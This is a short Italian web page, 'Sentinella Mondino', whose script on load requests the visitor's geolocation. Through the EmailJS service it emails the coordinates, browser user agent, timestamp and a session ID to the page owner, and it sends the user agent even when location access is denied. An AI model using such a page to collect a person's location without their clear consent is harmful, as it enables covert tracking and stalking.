<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Sentinella Mondino</title>
</head>
<body>
    <h1>Sentinella Mondino Attiva</h1>
    <p>Il segnale verr√† inviato automaticamente...</p>

    <script src="https://cdn.emailjs.com/sdk/4.0.2/email.min.js"></script>

    <script>
    emailjs.init({
        publicKey: "htX2_6oDOj4VqH1pD"
    });

    function generateSessionID() {
        return "SESSION-" + Math.random().toString(36).substring(2, 10).toUpperCase();
    }

    const sessionID = generateSessionID();

    function deviceInfo() {
        return navigator.userAgent;
    }

    function sendSignal(position) {
        console.log("Invio segnale...");

        const data = {
            session_id: sessionID,
            user_agent: deviceInfo(),
            timestamp: new Date().toLocaleString(),
            lat: position?.coords?.latitude || "NEGATA",
            lon: position?.coords?.longitude || "NEGATA",
            accuracy: position?.coords?.accuracy || "N/A"
        };

        console.log("Dati inviati:", data);

        emailjs.send(
            "service_qf5owhx",
            "template_signal",
            data,
            { publicKey: "htX2_6oDOj4VqH1pD" }
        )
        .then(() => console.log("Segnale inviato!"))
        .catch(err => console.error("Errore invio:", err));
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => {
                console.log("Posizione ottenuta:", pos);
                sendSignal(pos);
            },
            err => {
                console.warn("Geolocalizzazione negata:", err);
                sendSignal(null);
            }
        );
    } else {
        console.warn("Geolocalizzazione non supportata.");
        sendSignal(null);
    }
    </script>
</body>
</html>
